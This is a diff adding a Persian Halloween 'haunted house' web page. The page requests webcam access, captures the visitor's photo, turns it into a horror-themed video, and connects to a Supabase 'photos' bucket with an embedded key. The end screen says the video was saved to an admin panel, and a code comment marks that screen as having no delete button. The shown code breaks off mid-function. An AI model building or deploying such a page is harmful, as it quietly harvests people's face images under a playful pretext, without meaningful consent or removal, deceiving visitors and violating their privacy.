@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎃 خانه ارواح — هالووین</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%; overflow: hidden;
+      background: #000;
+      font-family: 'Courier New', monospace;
+      color: #e2e8f0;
+      user-select: none;
+    }
+    .screen {
+      position: fixed; inset: 0;
+      display: none; align-items: center; justify-content: center;
+      flex-direction: column; padding: 20px; text-align: center;
+    }
+    .screen.active { display: flex; }
+
+    .flash {
+      position: fixed; inset: 0; background: #fff; opacity: 0;
+      pointer-events: none; z-index: 999;
+      animation: flashAnim 8s infinite;
+    }
+    @keyframes flashAnim {
+      0%, 100% { opacity: 0; }
+      49.9% { opacity: 0; }
+      50% { opacity: 0.6; }
+      50.1% { opacity: 0; }
+      74.9% { opacity: 0; }
+      75% { opacity: 0.3; }
+      75.1% { opacity: 0; }
+    }
+    .vignette {
+      position: fixed; inset: 0;
+      background: radial-gradient(ellipse at center, transparent 20%, rgba(0, 0, 0, 0.7) 70%, #000 100%);
+      pointer-events: none; z-index: 7;
+    }
+
+    /* ═══ صفحه ۱ — ورود ═══ */
+    #welcomeScreen {
+      background: radial-gradient(ellipse at center, #1a0033 0%, #000 70%);
+      overflow: hidden;
+    }
+    .stars { position: fixed; inset: 0; pointer-events: none; z-index: 1; }
+    .star {
+      position: absolute; width: 2px; height: 2px;
+      background: #fff; border-radius: 50%;
+      animation: twinkle 3s infinite;
+    }
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 1; }
+    }
+    .blood-moon {
+      position: fixed; top: 30px; right: 30px;
+      width: 110px; height: 110px;
+      background: radial-gradient(circle at 35% 35%, #ff6666, #8b0000 60%, #4a0000);
+      border-radius: 50%;
+      box-shadow: 0 0 80px rgba(139, 0, 0, 0.9);
+      z-index: 1;
+      animation: moonPulse 4s infinite;
+    }
+    @keyframes moonPulse {
+      0%, 100% { box-shadow: 0 0 80px rgba(139, 0, 0, 0.9); }
+      50% { box-shadow: 0 0 120px rgba(255, 0, 0, 0.8); }
+    }
+    .wooden-door {
+      position: fixed; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 240px; height: 340px;
+      background: linear-gradient(90deg, #3a1f0a 0%, #5c3317 50%, #3a1f0a 100%);
+      border-radius: 120px 120px 0 0;
+      border: 6px solid #1a0d04;
+      box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 100, 0, 0.3);
+      z-index: 1;
+      animation: doorShake 5s infinite;
+    }
+    @keyframes doorShake {
+      0%, 90%, 100% { transform: translate(-50%, -50%) rotate(0); }
+      92% { transform: translate(-52%, -50%) rotate(-1deg); }
+      94% { transform: translate(-48%, -50%) rotate(1deg); }
+      96% { transform: translate(-50%, -50%) rotate(0); }
+    }
+    .wooden-door::after {
+      content: ''; position: absolute;
+      top: 50%; right: 20px;
+      width: 16px; height: 16px;
+      background: radial-gradient(circle, #ffcc00, #8b6914);
+      border-radius: 50%;
+      box-shadow: 0 0 15px #ffcc00;
+    }
+    #welcomeScreen h1 {
+      font-size: 32px; color: #ff8c42;
+      text-shadow: 0 0 20px #ff4500, 0 0 40px #ff4500;
+      margin-bottom: 16px; letter-spacing: 3px;
+      z-index: 5; position: relative; margin-top: 380px;
+    }
+    #welcomeScreen p {
+      color: #c4b5fd; font-size: 15px; line-height: 2;
+      max-width: 480px; margin-bottom: 24px;
+      z-index: 5; position: relative;
+    }
+    .enter-btn {
+      padding: 18px 42px; font-size: 18px;
+      background: linear-gradient(135deg, #ff4500, #8b0000);
+      color: #fff; border: 2px solid #ff4500;
+      border-radius: 50px; font-weight: bold;
+      cursor: pointer; font-family: inherit;
+      box-shadow: 0 0 30px rgba(255, 69, 0, 0.8);
+      animation: btnPulse 1.5s infinite;
+      z-index: 5; position: relative;
+      transition: 0.2s;
+    }
+    .enter-btn:hover { transform: scale(1.08); }
+    @keyframes btnPulse {
+      0%, 100% { box-shadow: 0 0 30px rgba(255, 69, 0, 0.8); }
+      50% { box-shadow: 0 0 60px rgba(255, 69, 0, 1); }
+    }
+
+    /* ═══ صفحه ۲ — وحشت ═══ */
+    #horrorScreen {
+      background: #000; overflow: hidden;
+      animation: screenShake 0.2s infinite;
+    }
+    @keyframes screenShake {
+      0%, 100% { transform: translate(0, 0); }
+      25% { transform: translate(-1px, 1px); }
+      50% { transform: translate(1px, -1px); }
+      75% { transform: translate(-1px, -1px); }
+    }
+    .noise {
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' /%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.3'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 6;
+      mix-blend-mode: overlay;
+      animation: noiseAnim 0.1s infinite;
+    }
+    @keyframes noiseAnim {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(-2px, 1px); }
+      50% { transform: translate(1px, -2px); }
+      75% { transform: translate(2px, 2px); }
+    }
+    .scanlines {
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.08) 2px, rgba(255, 0, 0, 0.08) 4px);
+      pointer-events: none; z-index: 7;
+      animation: scanMove 6s linear infinite;
+    }
+    @keyframes scanMove {
+      0% { background-position: 0 0; }
+      100% { background-position: 0 200px; }
+    }
+    .horror-header {
+      position: fixed; top: 0; left: 0; right: 0;
+      background: linear-gradient(90deg, transparent, rgba(139, 0, 0, 0.5), transparent);
+      color: #ff4444; padding: 12px; font-size: 15px;
+      letter-spacing: 4px; text-align: center; font-weight: bold;
+      z-index: 10; text-shadow: 0 0 10px #ff0000;
+      border-bottom: 1px solid rgba(255, 0, 0, 0.5);
+      animation: headerFlicker 2s infinite;
+    }
+    @keyframes headerFlicker {
+      0%, 100% { opacity: 1; }
+      45% { opacity: 0.7; }
+      47% { opacity: 1; }
+    }
+    .eyes-container, .hands-container {
+      position: fixed; inset: 0; pointer-events: none; z-index: 4;
+    }
+    .eye-pair {
+      position: absolute; display: flex; gap: 12px;
+      animation: eyeFade 3s infinite;
+    }
+    @keyframes eyeFade {
+      0%, 100% { opacity: 0; }
+      50% { opacity: 1; }
+    }
+    .eye-ball {
+      width: 20px; height: 20px;
+      background: radial-gradient(circle, #ff0000 30%, #8b0000 60%, #000 100%);
+      border-radius: 50%;
+      box-shadow: 0 0 15px #ff0000;
+      animation: eyeBlink 4s infinite;
+    }
+    @keyframes eyeBlink {
+      0%, 45%, 55%, 100% { transform: scaleY(1); }
+      50% { transform: scaleY(0.1); }
+    }
+    .creepy-hand {
+      position: absolute; font-size: 50px; opacity: 0;
+      animation: handReach 6s infinite;
+      filter: drop-shadow(0 0 15px rgba(255, 0, 0, 0.8));
+    }
+    @keyframes handReach {
+      0%, 80%, 100% { opacity: 0; transform: scale(0.5); }
+      85% { opacity: 0.7; transform: scale(1); }
+      90% { opacity: 0.3; transform: scale(0.9); }
+    }
+    .camera-peek {
+      position: fixed; bottom: 20px; left: 20px;
+      width: 160px; height: 120px;
+      border: 2px solid #ff0000; border-radius: 8px;
+      overflow: hidden; z-index: 9;
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
+    }
+    .camera-peek video {
+      width: 100%; height: 100%; object-fit: cover;
+      filter: hue-rotate(300deg) saturate(1.8) contrast(1.3) brightness(0.7);
+      transform: scaleX(-1);
+    }
+    .camera-peek::before {
+      content: '● REC'; position: absolute;
+      top: 4px; left: 8px;
+      color: #ff0000; font-size: 11px; font-weight: bold;
+      z-index: 2; text-shadow: 0 0 5px #ff0000;
+      animation: rec 0.8s infinite;
+    }
+    @keyframes rec {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.2; }
+    }
+    .spooky-text {
+      position: fixed; top: 10%; left: 0; right: 0;
+      text-align: center; z-index: 9; pointer-events: none;
+    }
+    .spooky-text h1 {
+      font-size: 36px; color: #ff0000;
+      text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+      letter-spacing: 4px; margin-bottom: 8px;
+      animation: textShake 0.3s infinite;
+    }
+    @keyframes textShake {
+      0%, 100% { transform: translate(0, 0); }
+      25% { transform: translate(-2px, 1px); }
+      50% { transform: translate(2px, -1px); }
+      75% { transform: translate(-1px, -2px); }
+    }
+    .spooky-text p {
+      font-size: 15px; color: #ff6666;
+      letter-spacing: 3px;
+      animation: flicker 0.8s infinite;
+    }
+    @keyframes flicker {
+      0%, 100% { opacity: 1; }
+      45% { opacity: 0.5; }
+      50% { opacity: 1; }
+    }
+    #terminal {
+      position: fixed; top: 45%; left: 50%;
+      transform: translateX(-50%);
+      background: rgba(10, 0, 0, 0.9);
+      border: 1px solid #ff0000; color: #ff4444;
+      padding: 14px; width: 90%; max-width: 520px;
+      height: 170px; overflow: hidden;
+      font-size: 12px; text-align: left; direction: ltr;
+      border-radius: 6px; font-family: 'Courier New', monospace;
+      z-index: 9;
+      box-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
+    }
+    #terminal div { margin: 3px 0; }
+    #countdown {
+      position: fixed; bottom: 30px; right: 30px;
+      font-size: 90px; color: #ff0000; font-weight: bold;
+      text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000;
+      font-family: 'Courier New', monospace;
+      z-index: 10;
+      animation: countPulse 0.5s infinite;
+    }
+    @keyframes countPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
+    .spinning-skull {
+      position: fixed; font-size: 60px; opacity: 0.3;
+      z-index: 3;
+      animation: skullSpin 8s linear infinite;
+      filter: drop-shadow(0 0 15px #ff0000);
+    }
+    @keyframes skullSpin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ═══ صفحه ۳ — پردازش ═══ */
+    #processingScreen {
+      background: radial-gradient(ellipse at center, #1a0033 0%, #000 70%);
+    }
+    #processingScreen .spinner {
+      width: 80px; height: 80px;
+      border: 4px solid rgba(255, 140, 66, 0.2);
+      border-top-color: #ff8c42;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 24px;
+      box-shadow: 0 0 40px rgba(255, 140, 66, 0.5);
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    #processingScreen h2 {
+      color: #ff8c42; font-size: 24px;
+      margin-bottom: 12px;
+      text-shadow: 0 0 20px #ff4500;
+    }
+    #processingScreen p {
+      color: #c4b5fd; font-size: 15px; margin: 6px 0;
+    }
+    #processingStatus {
+      margin-top: 20px; color: #ff8c42;
+      font-size: 14px; min-height: 20px;
+    }
+    .progress-bar {
+      width: 280px; height: 8px;
+      background: rgba(255, 140, 66, 0.2);
+      border-radius: 4px; overflow: hidden;
+      margin-top: 16px;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #ff8c42, #ff4500);
+      width: 0%; transition: width 0.3s;
+      box-shadow: 0 0 10px #ff8c42;
+    }
+
+    /* ═══ صفحه ۴ — پایان ═══ */
+    #endScreen {
+      background: radial-gradient(ellipse at center, #1a0033 0%, #000 70%);
+    }
+    #endScreen .emoji {
+      font-size: 80px; margin-bottom: 16px;
+      animation: pumpkinBounce 2s infinite;
+      filter: drop-shadow(0 0 30px rgba(255, 140, 66, 1));
+    }
+    @keyframes pumpkinBounce {
+      0%, 100% { transform: translateY(0) rotate(-3deg); }
+      50% { transform: translateY(-15px) rotate(3deg); }
+    }
+    #endScreen h1 {
+      color: #ff8c42; font-size: 30px;
+      margin-bottom: 12px;
+      text-shadow: 0 0 20px #ff4500;
+    }
+    #endScreen p {
+      color: #c4b5fd; font-size: 15px;
+      line-height: 1.9; max-width: 480px; margin: 6px 0;
+    }
+    .video-frame {
+      position: relative;
+      width: 280px; height: 280px;
+      margin: 16px 0;
+      border-radius: 20px; overflow: hidden;
+      border: 3px solid #ff4500;
+      box-shadow: 0 0 50px rgba(255, 69, 0, 0.7);
+      background: #000;
+    }
+    .video-frame video {
+      width: 100%; height: 100%; object-fit: cover;
+    }
+    .video-frame::after {
+      content: '🎃'; position: absolute;
+      bottom: 5px; right: 8px;
+      font-size: 30px;
+      filter: drop-shadow(0 0 10px #ff4500);
+      pointer-events: none;
+    }
+    .action-row {
+      display: flex; gap: 12px;
+      margin-top: 16px; flex-wrap: wrap;
+      justify-content: center;
+    }
+    .action-row button {
+      padding: 12px 26px; font-size: 14px;
+      border: none; border-radius: 10px;
+      cursor: pointer; font-family: inherit;
+      font-weight: bold; transition: 0.2s;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #ff4500, #8b0000);
+      color: #fff;
+      box-shadow: 0 0 20px rgba(255, 69, 0, 0.6);
+    }
+    .btn-primary:hover {
+      box-shadow: 0 0 40px rgba(255, 69, 0, 0.9);
+      transform: translateY(-2px);
+    }
+    canvas { display: none; }
+    .tiny-note {
+      position: fixed; bottom: 10px; left: 0; right: 0;
+      text-align: center; font-size: 10px;
+      color: #6b7280; opacity: 0.5; z-index: 20;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="flash"></div>
+  <div class="vignette"></div>
+
+  <!-- ═══ صفحه ۱ — ورود ═══ -->
+  <div class="screen active" id="welcomeScreen">
+    <div class="stars" id="stars"></div>
+    <div class="blood-moon"></div>
+    <div class="wooden-door"></div>
+    <h1>خانه ارواح</h1>
+    <p>
+      🩸 وارد شدن یعنی قبول خطر...<br>
+      🎬 یه ویدیوی ترسناک ازت می‌سازیم<br>
+      👁 یه چیزی داره نگاهت می‌کنه
+    </p>
+    <button class="enter-btn" id="enterBtn">🚪 وارد شو</button>
+    <p class="tiny-note">🎃 این یک تجربه هالووین است</p>
+  </div>
+
+  <!-- ═══ صفحه ۲ — وحشت ═══ -->
+  <div class="screen" id="horrorScreen">
+    <div class="noise"></div>
+    <div class="scanlines"></div>
+    <div class="eyes-container" id="eyesContainer"></div>
+    <div class="hands-container" id="handsContainer"></div>
+    <div class="spinning-skull" style="top: 20%; left: 10%;">💀</div>
+    <div class="spinning-skull" style="bottom: 15%; right: 12%; animation-direction: reverse;">💀</div>
+    <div class="horror-header">⚠️ خانه ارواح — هالووین ⚠️</div>
+    <div class="spooky-text">
+      <h1>🩸 خوش اومدی...</h1>
+      <p>در قفل شد</p>
+    </div>
+    <div class="camera-peek">
+      <video id="peekVideo" autoplay playsinline muted></video>
+    </div>
+    <div id="terminal"></div>
+    <div id="countdown">5</div>
+  </div>
+
+  <!-- ═══ صفحه ۳ — پردازش ═══ -->
+  <div class="screen" id="processingScreen">
+    <div class="spinner"></div>
+    <h2>🎬 در حال ساخت ویدیوی ترسناک...</h2>
+    <p>عکس تو داره تبدیل به یه فیلم ترسناک می‌شه</p>
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <p id="processingStatus">آماده‌سازی...</p>
+  </div>
+
+  <!-- ═══ صفحه ۴ — پایان (بدون دکمه حذف) ═══ -->
+  <div class="screen" id="endScreen">
+    <div class="stars" id="stars2"></div>
+    <div class="emoji">🎃</div>
+    <h1>هالووین مبارک!</h1>
+    <p>ویدیوی ترسناکت آماده شد 🎬</p>
+    <div class="video-frame">
+      <video id="resultVideo" controls autoplay loop muted playsinline></video>
+    </div>
+    <div class="action-row">
+      <button class="btn-primary" id="downloadBtn">⬇️ دانلود</button>
+      <button class="btn-primary" id="againBtn">🔄 دوباره</button>
+    </div>
+    <p class="tiny-note" style="position:static; margin-top:20px;">
+      🎃 ویدیو در پنل ادمین ذخیره شد
+    </p>
+  </div>
+
+  <canvas id="canvas"></canvas>
+  <canvas id="videoCanvas"></canvas>
+
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+    const SUPABASE_URL = 'https://cnagtdipvqsklheyoibk.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNuYWd0ZGlwdnFza2xoZXlvaWJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA2NzQxMDIsImV4cCI6MjEwNjI1MDEwMn0.yE-38ykrPFxytECNdNcUe0TRVgPAWSh-Oj64sXbMl4A';
+    const BUCKET_NAME = 'photos';
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    function createStars(id) {
+      const c = document.getElementById(id);
+      if (!c) return;
+      for (let i = 0; i < 60; i++) {
+        const s = document.createElement('div');
+        s.className = 'star';
+        s.style.left = Math.random() * 100 + '%';
+        s.style.top = Math.random() * 100 + '%';
+        s.style.animationDelay = Math.random() * 3 + 's';
+        c.appendChild(s);
+      }
+    }
+    createStars('stars');
+    createStars('stars2');
+
+    function createEyes() {
+      const c = document.getElementById('eyesContainer');
+      const positions = [
+        { top: '15%', left: '20%' },
+        { top: '25%', right: '15%' },
+        { top: '60%', left: '10%' },
+        { top: '70%', right: '20%' },
+        { top: '40%', left: '45%' },
+      ];
+      positions.forEach((pos, i) => {
+        const pair = document.createElement('div');
+        pair.className = 'eye-pair';
+        pair.style.animationDelay = i * 0.7 + 's';
+        Object.assign(pair.style, pos);
+        pair.innerHTML = '<div class="eye-ball"></div><div class="eye-ball"></div>';
+        c.appendChild(pair);
+      });
+    }
+
+    function createHands() {
+      const c = document.getElementById('handsContainer');
+      const positions = [
+        { top: '20%', left: '5%', rot: '45deg' },
+        { top: '70%', right: '5%', rot: '-45deg' },
+        { bottom: '10%', left: '30%', rot: '180deg' },
+      ];
+      positions.forEach((pos, i) => {
+        const h = document.createElement('div');
+        h.className = 'creepy-hand';
+        h.textContent = '✋';
+        h.style.animationDelay = i * 2 + 's';
+        Object.assign(h.style, pos);
+        if (pos.rot) h.style.transform = `rotate(${pos.rot})`;
+        c.appendChild(h);
+      });
+    }
+
+    const welcomeScreen = document.getElementById('welcomeScreen');
+    const horrorScreen = document.getElementById('horrorScreen');
+    const processingScreen = document.getElementById('processingScreen');
+    const endScreen = document.getElementById('endScreen');
+    const enterBtn = document.getElementById('enterBtn');
+    const terminalEl = document.getElementById('terminal');
+    const countdownEl = document.getElementById('countdown');
+    const resultVideo = document.getElementById('resultVideo');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const againBtn = document.getElementById('againBtn');
+    const peekVideo = document.getElementById('peekVideo');
+    const canvas = document.getElementById('canvas');
+    const progressFill = document.getElementById('progressFill');
+    const processingStatus = document.getElementById('processingStatus');
+
+    let stream = null;
+    let uploadedVideoPath = null;
+    let videoBlobGlobal = null;
+
+    let audioCtx = null;
+    function initAudio() {
+      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      if (audioCtx.state === 'suspended') audioCtx.resume();
+    }
+    function playTone(freq, duration, type = 'sine', volume = 0.1) {
+      if (!audioCtx) return;
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = type;
+      osc.frequency.value = freq;
+      gain.gain.value = volume;
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+      osc.stop(audioCtx.currentTime + duration);
+    }
+    function playDoorCreak() {
+      if (!audioCtx) return;
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.setValueAtTime(70, audioCtx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(180, audioCtx.currentTime + 1.2);
+      gain.gain.value = 0.12;
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1.2);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + 1.2);
+    }
+
+    enterBtn.addEventListener('click', async () => {
+      try {
+        initAudio();
+        playDoorCreak();
+
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false,
+        });
+        peekVideo.srcObject = stream;
+
+        const userPhotoBlob = await captureUserPhoto();
+        showProcessingScreen();
+        await buildVideoFromPhoto(userPhotoBlob);
+        showEndScreen();
+      } catch (err) {
+        alert('👻 برای ورود باید اجازه دوربین بدی!');
+        console.error(err);
+      }
+    });
+
+    async function captureUserPhoto() {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      await video.play();
+      await new Promise(r => setTimeout(r, 500));
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0);
+      return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+    }
+
+    async function buildVideoFromPhoto(photoBlob) {
+      const videoCanvas = document.getElementById('videoCanvas');
+      const W = 640, H = 640;
+      videoCanvas.width = W;
+      videoCanvas.height = H;
+      const ctx = videoCanvas.getContext('2d');
+
+      const img = new Image();
+      img.src = URL.createObjectURL(photoBlob);
+      await new Promise(r => { img.onload = r; });
+
+      const streamFromCanvas = videoCanvas.captureStream(30);
+      const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+        ? 'video/webm;codecs=vp9'
+        : 'video/webm';
+
+      const recorder = new MediaRecorder(streamFromCanvas, {
+        mimeType,
+        videoBitsPerSecond: 3000000,
+      });
+
+      const chunks = [];
+      recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+      const recordingDone = new Promise(resolve => {
+        recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+      });
+
+      recorder.start();
+
+      const TOTAL_DURATION = 8000;
+      let startTime = performance.now();
+
+      const bloodDrops = [];
+      for (let i = 0; i < 25; i++) {
+        bloodDrops.push({
+          x: Math.random() * W,
+          y: Math.random() * -H,
+          speed: 50 + Math.random() * 150,
+          size: 2 + Math.random() * 4,
+          delay: Math.random() * 3,
+        });
+      }
+
+      const skulls = [];
+      for (let i = 0; i < 3; i++) {
+        skulls.push({
+          angle: (i / 3) * Math.PI * 2,
+          radius: 200 + Math.random() * 60,
+          speed: 0.5 + Math.random() * 0.5,
+        });
+      }
+
+      const noiseParticles = [];
+      for (let i = 0; i < 80; i++) {
+        noiseParticles.push({
+          x: Math.random() * W,
+          y: Math.random() * H,
+          size: 1 + Math.random() * 3,
+        });
+      }
+
+      await new Promise(resolve => {
+        function animate() {
+          const elapsed = performance.now() - startTime;
+          const progress = Math.min(elapsed / TOTAL_DURATION, 1);
+          const t = elapsed / 1000;
+
+          progressFill.style.width = (progress * 100) + '%';
+          if (progress < 0.2) processingStatus.textContent = '🩸 پاشیدن خون...';
+          else if (progress < 0.4) processingStatus.textContent = '💀 اضافه کردن جمجمه‌ها...';
+          else if (progress < 0.6) processingStatus.textContent = '👁 باز کردن چشم‌ها...';
+          else if (progress < 0.8) processingStatus.textContent = '⚡ افکت‌های وحشت...';
+          else processingStatus.textContent = '📤 آپلود ویدیو...';
+
+          ctx.fillStyle = '#000';
+          ctx.fillRect(0, 0, W, H);
+
+          const shakeX = Math.sin(t * 30) * 3 + (Math.random() - 0.5) * 4;
+          const shakeY = Math.cos(t * 25) * 3 + (Math.random() - 0.5) * 4;
+
+          ctx.save();
+          ctx.translate(shakeX, shakeY);
+
+          const zoom = 1.1 + progress * 0.3;
+          const rotation = Math.sin(t * 0.5) * 0.03;
+
+          ctx.save();
+          ctx.translate(W / 2, H / 2);
+          ctx.rotate(rotation);
+          ctx.translate(-W / 2, -H / 2);
+
+          const offsetX = (W - W * zoom) / 2;
+          const offsetY = (H - H * zoom) / 2;
+          ctx.drawImage(img, offsetX, offsetY, W * zoom, H * zoom);
+          ctx.restore();
+
+          ctx.globalCompositeOperation = 'multiply';
+          ctx.fillStyle = `rgba(139, 0, 0, ${0.4 + Math.sin(t * 2) * 0.15})`;
+          ctx.fillRect(0, 0, W, H);
+          ctx.globalCompositeOperation = 'source-over';
+
+          const vigGrad = ctx.createRadialGradient(W/2, H/2, W*0.15, W/2, H/2, W*0.75);
+          vigGrad.addColorStop(0, 'rgba(0,0,0,0)');
+          vigGrad.addColorStop(1, 'rgba(60, 0, 0, 0.9)');
+          ctx.fillStyle = vigGrad;
+          ctx.fillRect(0, 0, W, H);
+
+          if (t > 2) {
+            const faceAlpha = Math.min((t - 2) / 1, 1) * (0.5 + Math.sin(t * 3) * 0.2);
+            ctx.save();
+            ctx.globalAlpha = faceAlpha;
+
+            const ghostGlow = ctx.createRadialGradient(W/2, H/2, 50, W/2, H/2, 250);
+            ghostGlow.addColorStop(0, 'rgba(255, 255, 255, 0.15)');
+            ghostGlow.addColorStop(1, 'rgba(255, 255, 255, 0)');
+            ctx.fillStyle = ghostGlow;
+            ctx.fillRect(0, 0, W, H);
+
+            const eyeY = H / 2 - 30;
+            const eyeSpacing = 70;
+            const eyeSize = 22 + Math.sin(t * 4) * 3;
+
+            ctx.fillStyle = '#ff0000';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 40;
+            ctx.beginPath();
+            ctx.ellipse(W/2 - eyeSpacing, eyeY, eyeSize, eyeSize * 0.6, 0, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.beginPath();
+            ctx.ellipse(W/2 + eyeSpacing, eyeY, eyeSize, eyeSize * 0.6, 0, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.fillStyle = '#000';
+            ctx.shadowBlur = 0;
+            const pupilOffsetX = Math.sin(t * 2) * 4;
+            const pupilOffsetY = Math.cos(t * 2) * 3;
+            ctx.beginPath();
+            ctx.arc(W/2 - eyeSpacing + pupilOffsetX, eyeY + pupilOffsetY, 6, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.beginPath();
+            ctx.arc(W/2 + eyeSpacing + pupilOffsetX, eyeY + pupilOffsetY, 6, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.restore();
+          }
+
+          bloodDrops.forEach(drop => {
+            if (t > drop.delay) {
+              drop.y += drop.speed / 60;
+              if (drop.y > H) {
+                drop.y = -20;
+                drop.x = Math.random() * W;
+              }
+
+              ctx.save();
+              ctx.fillStyle = `rgba(180, 0, 0, ${0.6 + Math.random() * 0.4})`;
+              ctx.shadowColor = '#ff0000';
+              ctx.shadowBlur = 10;
+
+              ctx.beginPath();
+              ctx.ellipse(drop.x, drop.y, drop.size, drop.size * 1.8, 0, 0, Math.PI * 2);
+              ctx.fill();
+
+              ctx.beginPath();
+              ctx.fillRect(drop.x - drop.size * 0.3, drop.y - drop.size * 3, drop.size * 0.6, drop.size * 3);
+              ctx.fill();
+
+              ctx.restore();
+            }
+          });
+
+          skulls.forEach((skull, i) => {
+            const angle = skull.angle + t * skull.speed;
+            const sx = W/2 + Math.cos(angle) * skull.radius;
+            const sy = H/2 + Math.sin(angle) * skull.radius;
+
+            ctx.save();
+            ctx.globalAlpha = 0.3 + Math.sin(t * 2 + i) * 0.2;
+            ctx.font = '50px serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 20;
+            ctx.fillText('💀', sx, sy);
+            ctx.restore();
+          });
+
+          if (t > 3) {
+            const handAlpha = Math.min((t - 3) / 1, 1) * (0.6 + Math.sin(t * 4) * 0.3);
+
+            ctx.save();
+            ctx.globalAlpha = handAlpha;
+            ctx.font = '80px serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 30;
+            const leftHandX = 40 + Math.sin(t * 3) * 15;
+            ctx.fillText('✋', leftHandX, H/2);
+            ctx.restore();
+
+            ctx.save();
+            ctx.globalAlpha = handAlpha;
+            ctx.font = '80px serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 30;
+            ctx.translate(W, 0);
+            ctx.scale(-1, 1);
+            const rightHandX = 40 + Math.cos(t * 3) * 15;
+            ctx.fillText('✋', rightHandX, H/2 + 50);
+            ctx.restore();
+          }
+
+          if (t > 1) {
+            const eyeAlpha = Math.min((t - 1) / 1, 1) * 0.7;
+
+            for (let i = 0; i < 6; i++) {
+              const ex = (i % 3) * (W / 3) + W / 6 + Math.sin(t * 2 + i) * 20;
+              const ey = Math.floor(i / 3) * (H / 2) + H / 4 + Math.cos(t * 2 + i) * 15;
+
+              ctx.save();
+              ctx.globalAlpha = eyeAlpha;
+              ctx.fillStyle = '#ff0000';
+              ctx.shadowColor = '#ff0000';
+              ctx.shadowBlur = 20;
+              ctx.beginPath();
+              ctx.arc(ex - 8, ey, 5, 0, Math.PI * 2);
+              ctx.fill();
+              ctx.beginPath();
+              ctx.arc(ex + 8, ey, 5, 0, Math.PI * 2);
+              ctx.fill();
+              ctx.restore();
+            }
+          }
+
+          if (t < 3) {
+            const alpha = Math.min(t / 0.5, 1) * (1 - Math.max(0, (t - 2) / 1));
+            ctx.save();
+            ctx.globalAlpha = alpha;
+            ctx.font = 'bold 54px system-ui';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 30;
+            ctx.fillStyle = '#8b0000';
+            ctx.fillText('🩸 تو گرفتار شدی', W/2 + 2, H/2 - 60 + 2);
+
+            ctx.fillStyle = '#ff0000';
